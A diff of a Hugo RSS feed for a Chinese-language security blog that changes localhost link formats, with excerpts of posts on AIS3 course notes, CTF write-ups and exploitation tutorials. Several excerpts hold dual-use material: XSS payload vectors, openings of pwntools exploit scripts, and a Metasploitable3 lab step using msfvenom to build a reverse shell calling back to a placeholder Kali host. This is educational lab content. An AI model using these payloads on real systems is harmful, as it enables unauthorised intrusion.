@@ -2,633 +2,633 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on ErrorPro</title>
-    <link>//localhost:1313/posts/</link>
+    <link>http://localhost:1313/posts/</link>
     <description>Recent content in Posts on ErrorPro</description>
     <generator>Hugo</generator>
     <language>zh-Hant-TW</language>
     <lastBuildDate>Thu, 01 Aug 2024 00:00:00 +0800</lastBuildDate>
-    <atom:link href="//localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>【AIS3】API 安全</title>
-      <link>//localhost:1313/posts/2024/ais3_d4_1/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d4_1/</link>
       <pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d4_1/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d4_1/</guid>
       <description>API 安全 -中華資安國際 資安研究員 zodius&#xA;技術簡介 What is API? 點炒飯 跟廚師說一份炒飯 叫廚師打蛋切菜&amp;hellip; 好處 把商業邏輯或業務邏輯封裝成簡單邏輯&#xA;本質：封裝 無需關注細節，專注自己業務邏輯 透過介面溝通，可同時開發 前後端邏輯分離，減少流量與資料相依性 API 發展 RPC 跨電腦溝通, ex: 轉帳、查詢 隨 http 發展演變成 Web service 專注於特定任務 SOAP 傳輸 XML 格式協議 WSDL 約定 interface web service 提供參數 缺點 - GetFile() 可能很多種定義 範圍混亂，如何拆分沒有統一標準 SOAP header - 方法 body - 正式請求 Google hacking wsdl 可能可以找到很多酷東西&#xA;可從中獲得網站資訊&#xA;RESTful API 解決範圍定義問題&#xA;Header&#xA;method GET POST PUT DELETE HEAD OPTIONS CONNECT TRACE URL version Representational State Transfer 狀態轉移</description>
     </item>
     <item>
       <title>【AIS3】Cloud Security</title>
-      <link>//localhost:1313/posts/2024/ais3_d4_2/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d4_2/</link>
       <pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d4_2/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d4_2/</guid>
       <description>Cloud Security -中華資安國際 資安研究員 黃聖筌 Husky&#xA;雲端基本介紹 為啥上雲 實現靈活的資應用 幫助企業降低成本支出 按一按就可以升級 資安沒做好還是會噴$$&#xA;降低行業入門門檻 節省實體硬體成本 專注於業務發展 不須管理硬體與伺服器維運 故障機率低 除了前幾天的 Azure 安全? 不安全 雲端介紹 責任 出問題時可以踢皮球&#xA;責任歸屬 使用者永遠保有下面責任 資料 CSA Top11 Insufficient identity, credentials, access, and key Management Insecure interfaces and application programming interfaces (APIs) Misconfiguration and inadequate change control Lack of cloud security architecture and strategy Insecure software development Unsecured third-party resources System vulnerabilities Accidental cloud data disclosure Misconfiguration and exploitation of serverless and container workloads Organized crime/hackers/advanced persistent threats (APTs) Cloud storage data exfiltration https://blog.</description>
     </item>
     <item>
       <title>【AIS3】前端不只有 alert 可以彈</title>
-      <link>//localhost:1313/posts/2024/ais3_d4_3/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d4_3/</link>
       <pubDate>Thu, 01 Aug 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d4_3/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d4_3/</guid>
       <description>前端不只有 alert 可以彈 -DEVCORE 資安研究員 黃志仁 splitline&#xA;安全原則 同源政策 A 網站不能讀 B 網站的東西(Browser 層限制) 可能可以寫 CSRF(Cross-Site Request Forgery) superlogout.com 點進去會把一堆服務登出，按進去請小心 偽造 client 端的惡意請求 即使使用 POST 也有機會被攻擊 CSRF Token 使用者訪問網站時被設定一個 token 放在 cookie 發送請求需同時送出 token 不能 CSRF 的情況 非 GET 或 POST 請求 特殊 HTTP header Samesite Cookie Lax 只有 &amp;lt;a&amp;gt;、&amp;lt;link&amp;gt;、&amp;lt;form method=&amp;quot;GET&amp;quot;&amp;gt; 會帶 cookie 在 Chrome、Edge 上預設 Strict 不論如何都不會從其他地方把 cookie 帶過來 None 不論如何都會帶 cookie 新版標準需要帶 Secure XSS Cross-Site Scripting 讓使用者瀏覽器執行駭客給的任意 Script Self-XSS 自己手動把 Script 跑起來 XSS Category Reflected XSS 惡意輸入一次性的映射 (Reflect) 到網頁上 ex: 搜尋欄輸入 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; 後按下搜尋彈出 alert Stored XSS 伺服器會儲存 (store) 駭客的惡意輸入 ex: 留言板有惡意腳本，所有人看到都會執行 DOM-based XSS JavaScript 讀取惡意輸入造成 XSS Event Handler &amp;lt;svg/onload=alert(1)&amp;gt; &amp;lt;img src=x onerror=alert(1)&amp;gt; &amp;lt;input onfocus=alert(1)&amp;gt; javascript: Scheme &amp;lt;a href=&amp;quot;javascript:alert(1)&amp;quot;&amp;gt;click me&amp;lt;/a&amp;gt; location.</description>
     </item>
     <item>
       <title>【AIS3】Gadget 不只有 POP 可以用</title>
-      <link>//localhost:1313/posts/2024/ais3_d3_3/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d3_3/</link>
       <pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d3_3/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d3_3/</guid>
       <description>Gadget 不只有 POP 可以用 -undefined 戰隊 林宇翔&#xA;ROP gadgets 【系統安全】Stack Overflow Basic ROP lab01 solution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #!/usr/bin/env python3 from pwn import * elf = context.binary = ELF(&amp;#39;./rop1&amp;#39;) context.os = &amp;#39;linux&amp;#39; context.arch = &amp;#39;amd64&amp;#39; context.log_level = &amp;#39;DEBUG&amp;#39; if args.REMOTE: ip = &amp;#39;35.</description>
     </item>
     <item>
       <title>【AIS3】永不停歇的競逐 - 威脅研究員與資安女力的挑戰</title>
-      <link>//localhost:1313/posts/2024/ais3_d3_4/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d3_4/</link>
       <pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d3_4/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d3_4/</guid>
       <description>永不停歇的競逐 - 威脅研究員與資安女力的挑戰 -TXOne Networks Inc. 威脅研究經理 Mars Cheng ＆ DEVCORE 技術專案經理 Hazel Yen&#xA;TXOne 介紹 OT security issue&#xA;OT security market&#xA;Mars 學生時期 reverse engineering with SDR 就業時期 國家資通安全研究院 資安工程師 工控 趨勢科技 資安威脅研究員 TXOne 威脅研究經理 CCPA&#xA;手機鑑識 無法補洞 -&amp;gt; 高強度監控&#xA;urgent/11&#xA;data-link bus&#xA;:star: cybersec, RSA (concept, 未來發展) 多看 conference&#xA;CVE 流程 廠商是 CNA 只有廠商或 ro ot CNA 可以核發自己的漏洞 不是 CNA 可以自己申請 CVE 由其他 CNA 核發 會記錄廠商不認定漏洞 廠商可不修補 OPSEC 攻擊者行為在受監控下不會被偵測到</description>
     </item>
     <item>
       <title>【AIS3】深入淺出網域(AD)安全:細探各項AD組態設定的濫用</title>
-      <link>//localhost:1313/posts/2024/ais3_d3_1/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d3_1/</link>
       <pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d3_1/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d3_1/</guid>
       <description>深入淺出網域(AD)安全:細探各項AD組態設定的濫用 -TXOne Networks Inc. Threat Researcher Dexter Chen&#xA;教材 Windows Server 2019 Windows 10 Kali Linux Active Directory Windows Domain Service LDAP(Lightweight Directory Access Protocol) + Kerberos(MS ver.) + DNS SSO Services (Base on Kerberos) AD Overview Active Directory (AD) - Directory Service Domain Controller (DC) 某台存著 AD 資料庫、管理網域中 AD Object 的電腦，提供驗證服務 Domain Directory 存在 DC 一個網域可以有多個 DC Object Attribute Forest LDAP Overview LDAP Path DN(Distinguished Name) RDN(Relative Distinguished Name) CN(Common Name) OU(Organizational Unit Name) DC(Domain Component) O(Organizational Unit) User, Computer, and Group Account User Account Person or service account Computer Account Group Active Directory objects that contain users, contacts, computers, and other groups Group Policy 作用於 User, Computer Accounts Security Identifier (SID) 識別唯一安全原則或安全群組 可以代表 User, Group, Computer Active Directory Database AD DS database (NTDS.</description>
     </item>
     <item>
       <title>【AIS3】網頁動態安全檢測與報戶 (RASP)</title>
-      <link>//localhost:1313/posts/2024/ais3_d3_2/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d3_2/</link>
       <pubDate>Wed, 31 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d3_2/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d3_2/</guid>
       <description>網頁動態安全檢測與報戶 (RASP) -中華資安國際 資安研究員 zodius&#xA;Lab: https://github.com/zodius/rasp-lab&#xA;Introduction 防護邊界 firewall WAF IPS 攻擊 內部攻擊 感染設備 雲端服務 傳統網路防護模型 外部檢查 DDOS IPS/IDS WAF firewall 應用程式 code effort 端點防護 EDR/MDR SOC 預防 vs 偵測 prevention 偵測特徵 缺點：混淆、新型態攻擊 detection 發生傷害 應變 RASP Real-time Application Self-Protection hook 系統底層的 instruction 執行前做檢核 四個特性 避免混淆或序列化 精準阻擋 - 執行前先判斷，避免誤殺 偵測未知漏洞 - 不使用特徵偵測 結合 SIEM 回顧計算機組織 Source -&amp;gt; Transform -&amp;gt; Intermediate -&amp;gt; Execution&#xA;Source Source Code Serialized code Transform Compile Interpret bytecode Intermediate IL(中間碼) &amp;lt;- RASP Execution VM JIT Machine code &amp;lt;- RASP 偵測 IL、Machine code</description>
     </item>
     <item>
       <title>【AIS3】IDA 不只有 F5 可以按 IDA 101, Reverse 101</title>
-      <link>//localhost:1313/posts/2024/ais3_d2_2/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d2_2/</link>
       <pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d2_2/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d2_2/</guid>
       <description>IDA 不只有 F5 可以按 IDA 101, Reverse 101 -undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇&#xA;IDA 介紹 IDAFree/IDAPro/IDATeam 如何使用 IDA(新手) 開 binary 一路按 ok F5 沒反應 IDA Free@ubuntu Fix Qt套件更新&#xA;sudo apt install libxcb-xinerama0 IDA Free - load ELF/PE/MachO hex view disassemble decompile function 藍 library func 紫 external symbol 白 regular func 搜尋:&#xA;直接輸入:從頭匹配 [ctrl+f5]:模糊搜尋 option-&amp;gt; general disassembly view (graph) 圖形化 若case夠多，會變成 jump table&#xA;disassembly view (text) 優點:</description>
     </item>
     <item>
       <title>【AIS3】IoT 檢測實務</title>
-      <link>//localhost:1313/posts/2024/ais3_d2_3/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d2_3/</link>
       <pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d2_3/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d2_3/</guid>
       <description>IoT 檢測實務 -中華資安國際 副理 王凱慶 Keniver&#xA;Introduction IoT 拿不到韌體 -&amp;gt; 不能逆向 IoT 在哪裡 關鍵基礎設施 環境監測 控制關鍵設施 商業 廣告系統 生產自動化 門禁系統 社會安全 科技執法 交通控制 家中 智慧家庭 醫療照顧 IoT 設備、惡意程式數量持續增加&#xA;IoT 生態系 設備產業生態系 由於硬體與其程式可以被重複利用與整合於其他產品中，因此ODM 廠商可能會與多間OEM 廠商合作，進而拓展經濟規模。 這樣的架構下ODM 的硬體與軟體會被複製到多個OEM 產品上，若ODM 廠商未建立良善的安全開發流程，而OEM 廠商也只改個Logo 就將其出品，那就可能導致一家烤肉萬家香一個漏洞萬家通用的現象發生。&#xA;華為 -&amp;gt; 海康衛視 -&amp;gt; SOC -&amp;gt; 雄邁 -&amp;gt; OVM 監視器廠商&#xA;登入頁面差不多 外觀 為何研究 IoT 數量多, 通用性高, 洞好找 效能要求 廠商方便，不加保護 OWASP IoT Top 10 I1 Weak Guessable, or Hardcoded Passwords 弱密碼 I2 Insecure Network Services 運行不必要甚至不安全的網路服務 ex: open 7000 port -&amp;gt; 一直拿到 GPS 資訊</description>
     </item>
     <item>
       <title>【AIS3】從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招</title>
-      <link>//localhost:1313/posts/2024/ais3_d2_4/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d2_4/</link>
       <pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d2_4/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d2_4/</guid>
       <description>從遊戲學 Windows Reverse - 除了 F5 之外還有哪幾招 -undefined 戰隊 林祐聖 ＆ 陳兆閔 ＆ TeamT5杜浦數位安全 RD 林哲宇&#xA;Link Start! 分析目標的五個階段 理想 執行方式 -&amp;gt; 分析方式 -&amp;gt; 觀察目標 -&amp;gt; 理解邏輯 -&amp;gt; 寫腳本 現實 跳來跳去 執行方式(Debug 能力) 作業系統版本、架構不對 執行環境架不起來 缺少相依套件 相依套件版本不對 分析方式(Survey 能力) 找不到適合分析目標的工具 不知道目標如何實作 ex: IDA 分析 C#&#xA;觀察目標(觀察力) golang, rust 找不到關鍵處 IDA 一堆 Function 理解邏輯(逆向能力) 看 Code 速度 理解程式在做什麼 猜出題者想做什麼 寫腳本(程式、工具使用) 不會寫程式 工具不熟悉 ex: z3, pwntools, gdb script&amp;hellip; 資料結構、演算法不熟 ex: 有向循環圖找一條路徑滿足特定條件 CTF Reverse 做以下假設幫助思考 題目一定有 flag -&amp;gt; 出題者用某種方式把 flag 藏起來 達到某個條件會觸發計算或驗證 flag 的操作 驗證類型：輸入正確時輸出 correct，反之 wrong 計算類型：執行到特定程式碼解密出 flag 出題者通常基於什麼做出題目的 ex: 某專案、工具、論文 工具 Detect It Easy 確認 binary 類型 如何實作 是否加殼 CFF Explorer 觀察 PE 結構 更改結構設定 Cheat Engine 記憶體掃描 Process Monitor Sysinternals kit 監控紀錄系統行為 CTF 看到以下事件可多關注 network file write process create IDA Pro 反組譯、反編譯 idapython plugin x64dbg x64dbgpy 不能 debug windows kernel -&amp;gt; windbg PACMAN - 2023 AIS3 Pre-exam 觀察 DIE 取得 PE 檔案資訊</description>
     </item>
     <item>
       <title>【AIS3】資安倫理</title>
-      <link>//localhost:1313/posts/2024/ais3_d2_1/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d2_1/</link>
       <pubDate>Tue, 30 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d2_1/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d2_1/</guid>
       <description>資安倫理 -法務部調查局 調查官 陳彥后&#xA;前言 去年資安人力吃緊，今年沒有改善。&#xA;資安事件回應、情資分析佔最多缺額&#xA;企業資安預算逐年提高&#xA;這是最好的時代，也是最壞的時代&#xA;認清工作現實 資安的工作，絕大多數絕非學生時期的 CTF 及各式競賽 更多的是產品的開發及服務的提供 平凡到超絕 人力 -&amp;gt; 人才 -&amp;gt; 人物 基本法律觀念 前科 個人資料保護法施行細則第 4 條第 6 項 警察刑事紀錄證明核發條例第 6 條但書另規定 無法申請良民證 無法出入境某些國家 從事公職及特定部分工作 刑事流程 妨害電腦使用罪 刑法第 358 條至第 363 條 358 - 無故輸入他人帳號密碼、破解使用電腦之保護措施或利用電腦系統之漏洞，而入侵他人之電腦 359 - 無故取得、刪除或變更他人之電腦資料 360 - 無故以電腦程式或其他電磁方式干擾他人電腦或其相關設備，致生損害於公眾或他人者，處三年以下有期徒刑、拘役或科或併科十萬元以下罰金。 361 - 對於公務機關之電腦或其相關設備犯前三條之罪者，加重其刑至二分之一 362 - 製作專供犯本章之罪之電腦程式，而供自己或他人犯本章之罪，致生損害於公眾或他人者，處五年以下有期徒刑、拘役或科或併科二十萬元以下罰金。 製作 malware 363 - 第 358 條至第 360 條須告訴乃論。 361, 362 非告訴乃論 實際案例 自架 DDoS 提供網站，以政府單位為目標，錄製攻擊過程並放在 YT 上招攬生意 拿女友帳號改感情狀況 打進校務系統改全校成績 與公司人員相處不睦離職，將公司配發於公務使用電腦，私人檔案及公司相關檔案刪除 個人資料保護法 個資</description>
     </item>
     <item>
       <title>【AIS3】The Journey of Becoming a Vulnerability Researcher</title>
-      <link>//localhost:1313/posts/2024/ais3_d1_1/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d1_1/</link>
       <pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d1_1/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d1_1/</guid>
       <description>The Journey of Becoming a Vulnerability Researcher -DEVCORE 資深資安研究員 楊安傑 Angelboy&#xA;案例 WannaCry(Eternel Blue) CrowdStrike BSOD Bug Hunting 主動找尋可能的漏洞 漏洞可能造成的危害 Remote Command Execution Privilege Escape Information Disclosure Denial of Service Vulnerability Researcher 漏洞挖掘分析 攻擊手法研究 How to Start Prepare the required knowledge 計概、計組、C語言、asm、OS 程式設計師的自我修養 Binary HACKS The Art of Software Security Assessment 台大台科交大聯合課程 實作 AIS3 MyFirstCTF 台灣好厲駭 pwn.college Live Overflow CTF 一場好的 CTF 會讓你學到技術&#xA;0ctf 2019 - AddressSanitizer 保護機制 *ctf - oob-v8，怎麼打 Browser 0ctf 2020 - Chromium RCE DEFCON 2022 QUAL - ncuts，兩萬多個 binary 解 reverse 拼出 flag.</description>
     </item>
     <item>
       <title>【AIS3】威脅情資＆機器學習</title>
-      <link>//localhost:1313/posts/2024/ais3_d1_2/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d1_2/</link>
       <pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d1_2/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d1_2/</guid>
       <description>威脅情資＆機器學習 -奧義智慧科技 資安研究處長 陳仲寬 ＆ 資安研究員 陳憶賢 ＆ 資安研究員 黃俊嘉 ＆ 資安研究員 陳勝舢&#xA;About the Course We believe AI will change the landscape of cybersecurity, therefore, in this course, we would like to combine the AI and CTI applications.&#xA;Goal: Understand the basic concept of CTI Apply ML/AI to solve CTI problems 威脅情資概述 What is Threat Intelligence? 知己知彼，百戰不殆 Every contact leaves a trace Actionable Threat Intelligence 情資有相當多呈現方式，不是每種場域都適合 有什麼樣的情資 如何使用情資 情資可應用程度 「公部門易受外網攻擊，成功阻擋的防禦率高」 == 屁話</description>
     </item>
     <item>
       <title>【AIS3】面對國家級關鍵基礎設施網路攻擊威脅: 從工業控制系統到網路攻防</title>
-      <link>//localhost:1313/posts/2024/ais3_d1_3/</link>
+      <link>http://localhost:1313/posts/2024/ais3_d1_3/</link>
       <pubDate>Mon, 29 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_d1_3/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_d1_3/</guid>
       <description>面對國家級關鍵基礎設施網路攻擊威脅: 從工業控制系統到網路攻防 -TXOne Networks Inc. Senior Threat Researcher Yenting Lee&#xA;關鍵基礎設施(CI) 與工業控制系統(ICS) 現狀 對產業特性、網路架構及相關經驗不熟悉 資安人員少接觸 不知道產業實務應優先考慮的事項 最初設計沒對資安做考量 大綱 關鍵基礎設施 工業控制系統 ICS 攻擊策略 CI 防禦策略 關鍵基礎設施 (CI) 受到衝擊會影響國家經濟，自然環境或社會安全等設施&#xA;各國對 CI 定義稍有不同&#xA;大多與能源、交通、醫療、通訊、金融、政府相關 美國 CI 賭場 飯店 核能 國家級 CI 網路攻擊 2009 Stuxnet 對伊朗核能設施攻擊 離心機異常加速 多個 0 day 漏洞 第一個針對工業控制環境的攻擊 2015 俄羅斯沙蟲團隊針對烏克蘭電網 破壞為目的 大量妨礙策略 2023 丹麥能源產業攻擊鏈 偵查 武裝 遞送 漏洞利用 安裝 命令控制 行動 針對 CI 攻擊不一定要用一堆 0 day 為何 CI 難防攻擊 產業結構龐大 醫療保健產業: 個資外洩 供應鏈關係緊密 半導體產業: 供應鏈關係緊密 (設計-&amp;gt;製造-&amp;gt;封裝) 工業控制系統環境 工業控制系統 (ICS) 普渡模型 Layer 0 物理設備 感測器 Layer 1 控制器 PLC Layer 2 人機介面 HMI 現場設備顯示/控制 Layer 3 OT 環境伺服器 搜集、分析資料 Layer 4/5 * 風險管理需求 IT OT CIA 強調可用性 3~5 年更新 10~20 年更新 可任意擴充 無法自行安裝任何軟體安全性套件 非即時性系統 即時性系統 可依需求重開機 不可任意重開機 一般通訊協定 ICS 通訊協定 OT 環境的脆弱性 內部威脅: 第三方工程師或廠商設備 老舊系統: 許多作業系統或設備已終止支援 網路扁平: 網路未適當分割 更新限制: 設備保持運行，難以實現更新流程 不進行螢幕鎖定 可程式化邏輯控制器 (PLC) 用來執行特定的工作，達到自動化控制現場設備 PLC 如何程式化 IEC 61131-3 標準定義 PLC 程式 5 種語言進行程式撰寫 圖形化 階梯圖(Ladder Diagram, LD) 功能區塊圖(Function Block Diagram, FBD) 順序功能流程圖(Sequential Function Chart, SFC) 文字(Python) 指令表(Instruction List Diagram, ILD) 結構化文字 STL OT 環境架構 工程師電腦有最高權限 安全性 Safety !</description>
     </item>
     <item>
       <title>【Pico】Pwn 系列解題紀錄</title>
-      <link>//localhost:1313/posts/picoctf/pwn/</link>
+      <link>http://localhost:1313/posts/picoctf/pwn/</link>
       <pubDate>Tue, 16 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/picoctf/pwn/</guid>
+      <guid>http://localhost:1313/posts/picoctf/pwn/</guid>
       <description>【Pico】Pwn 系列解題紀錄 這篇只是用來放解題的程式碼，之後再補解題過程。&#xA;heap0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #!/usr/bin/env python3 from pwn import * context.binary = &amp;#39;./chall&amp;#39; context.os = &amp;#39;linux&amp;#39; context.arch = &amp;#39;amd64&amp;#39; context.log_level = &amp;#39;DEBUG&amp;#39; if args.REMOTE: ip = &amp;#39;tethys.picoctf.net&amp;#39; port = 49849 p = remote(ip, port) else: p = process() p.sendline(&amp;#34;2&amp;#34;) p.sendline(b&amp;#34;a&amp;#34;*50) p.sendline(b&amp;#34;4&amp;#34;) p.interactive() heap1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #!</description>
     </item>
     <item>
       <title>【系統安全】Stack Overflow</title>
-      <link>//localhost:1313/posts/2024/stack_overflow/</link>
+      <link>http://localhost:1313/posts/2024/stack_overflow/</link>
       <pubDate>Fri, 05 Jul 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/stack_overflow/</guid>
+      <guid>http://localhost:1313/posts/2024/stack_overflow/</guid>
       <description>先備知識 【系統安全】組合語言 【系統安全】Linux 安全機制 Stack Overflow Stack 回顧 Memory Layout，Stack 是一種後進先出的資料結構，在記憶體上由高位址往低位址長，上面會保存函式呼叫的資訊、區域變數。&#xA;注意 32 位元與 64 位元 的差別：&#xA;x86: 函式參數會放在 return address 上方 x64: System V AMD64 ABI，前 6 個整數參數依序放在 rdi, rsi, rdx, rcx, r8, r9, 後面如果還有才會放在 stack 上。 Stack Overflow 當程式輸入資料的大小超過 buffer 的大小，會蓋到該 buffer 之後的記憶體，稱為 Overflow，而 Stack Overflow 表示在 stack 上發生了 Overflow。另外還有 Heap Overflow 表示在 heap 上發生了 Overflow。&#xA;Concept 尋找危險函式，可以確認是否有 buffer overflow，常見的危險函式有 gets, scanf, strcpy, strcat, sprintf, vsprintf 確定 padding 長度，計算要蓋到的地址離 buffer 的距離 如果要蓋 return address，直接看 frame pointer 位置然後找出偏移 如果要蓋 stack 上特定資料，需要先觀察 stack 上的資料再找出偏移 希望透過覆蓋記憶體位址來控制程式的執行流程 ROP 用於繞過 NX 保護的漏洞利用技術 利用程式碼已有的片段，拼出想要的功能，而控制程式執行流程 這些片段稱為 gadget，通常以 ret 結尾 可使用 ROPgadget, ropper, pwntools 來找 gadget ret2win ret2shellcode ret2syscall ret2libc GOT </description>
     </item>
     <item>
       <title>【CTF-WriteUp】AIS3 Pre-Exam 2024</title>
-      <link>//localhost:1313/posts/2024/ais3_pre_exam_2024/</link>
+      <link>http://localhost:1313/posts/2024/ais3_pre_exam_2024/</link>
       <pubDate>Tue, 11 Jun 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/ais3_pre_exam_2024/</guid>
+      <guid>http://localhost:1313/posts/2024/ais3_pre_exam_2024/</guid>
       <description>AIS3 Pre-Exam 2024 先放結果&#xA;My First CTF：潛力獎&#xA;心得 第一次參加 My First CTF 跟 AIS3 Pre-Exam，最後有幾題到比賽結束才解出來，覺得滿可惜的，&#xA;希望下次能通靈出更多題目。&#xA;Write Up Misc Welcome 簽到題&#xA;FLAG: AIS3{Welc0me_to_AIS3_PreExam_2o24!}&#xA;Quantum Nim Heist Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other. 跟電腦玩 Nim 遊戲，Wiki - Nim，&#xA;這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。&#xA;看到 server.py&#xA;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def menu(): print_main_menu() choice = input(&amp;#39;what would you like to do?</description>
     </item>
     <item>
       <title>【資訊安全】Metasploitable3 滲透測試實作（筆記）</title>
-      <link>//localhost:1313/posts/2024/metasploitable3_writeup/</link>
+      <link>http://localhost:1313/posts/2024/metasploitable3_writeup/</link>
       <pubDate>Sat, 20 Apr 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2024/metasploitable3_writeup/</guid>
+      <guid>http://localhost:1313/posts/2024/metasploitable3_writeup/</guid>
       <description>先備知識 知道如何使用 VMware 或 VirtualBox Kali Linux 基本操作 能夠讓 Kali 連線至 Metasploitable3 良好的網路環境 確認 IP Win2k8:&#xA;1 ipconfig ub1404:&#xA;1 ifconfig 弱點掃描 使用 Nmap 將所有 port 掃描一遍，查看主機上開啟的 Service&#xA;1 sudo nmap -sV -sS -n -v --reason --open -p- &amp;lt;Metasploitable3 IP&amp;gt; &amp;lt;Metasploitable3 IP&amp;gt; 請替換成靶機 IP&#xA;文件上傳漏洞 掃描 8585 port 是否存在文件上傳漏洞&#xA;1 davtest -url http://&amp;lt;Metasploitable3 IP&amp;gt;:8585/uploads/ 利用 msfvenom 生成 reverse shell payload 1 msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Kali IP&amp;gt; LPORT=4444 -f raw &amp;gt; payload.</description>
     </item>
     <item>
       <title>【HTB】Sacred Scrolls: Revenge</title>
-      <link>//localhost:1313/posts/HTB/Sacred-Scrolls-Revenge/</link>
+      <link>http://localhost:1313/posts/HTB/Sacred-Scrolls-Revenge/</link>
       <pubDate>Tue, 05 Mar 2024 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/HTB/Sacred-Scrolls-Revenge/</guid>
+      <guid>http://localhost:1313/posts/HTB/Sacred-Scrolls-Revenge/</guid>
       <description>【HTB】Sacred Scrolls: Revenge Description Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.&#xA;Checksec 1 2 3 4 5 6 7 [*] &amp;#39;/home/err0rpro/CTFLab/Hackthebox/SacredScrollsRevenge/sacred_scrolls&amp;#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b&amp;#39;.</description>
     </item>
     <item>
       <title>【CTF】Heap Exploitation(Part 1 - Overview, UAF)</title>
-      <link>//localhost:1313/posts/2023/ctf_heap/</link>
+      <link>http://localhost:1313/posts/2023/ctf_heap/</link>
       <pubDate>Thu, 16 Nov 2023 00:00:00 +0800</pubDate>
-      <guid>//localhost:1313/posts/2023/ctf_heap/</guid>
+      <guid>http://localhost:1313/posts/2023/ctf_heap/</guid>
       <description>Heap Exploitation 預備知識 需要注意glibc的版本 知道典型的Memory layout 記憶體計算 1. Heap Overview 跟資料結構的Heap不同 存動態資料的記憶體區段 在Memory中由低往高生長 Allocator Linux中由glibc實作 dlmalloc (Doug Lea Malloc) - General-purpose allocator ptmalloc (Per-thread malloc) - glibc jemalloc - FreeBSD / Firefox / Facebook&amp;hellip; tcmalloc - Google / Golang / Chrome&amp;hellip; malloc dynamic memory allocator 第一次呼叫 malloc 1 2 3 4 5 6 if(要分配的大小小於128KB){ if(是第一次呼叫) 呼叫 brk() -&amp;gt; sys_brk() 分配 132KB 的Segment，此Segment稱為 main arena }else{ // 超過128KB mmap() -&amp;gt; sys_mmap() } 程式執行中free掉記憶體後不會馬上還給系統，會由glib代管 Chunk glibc做記憶體管理的資料結構 malloc分配的空間單位，分配出來的大小必須對齊0x10 Ex: malloc(0x15) -&amp;gt; 得到大小 0x20 + 0x10(header) 的chunk 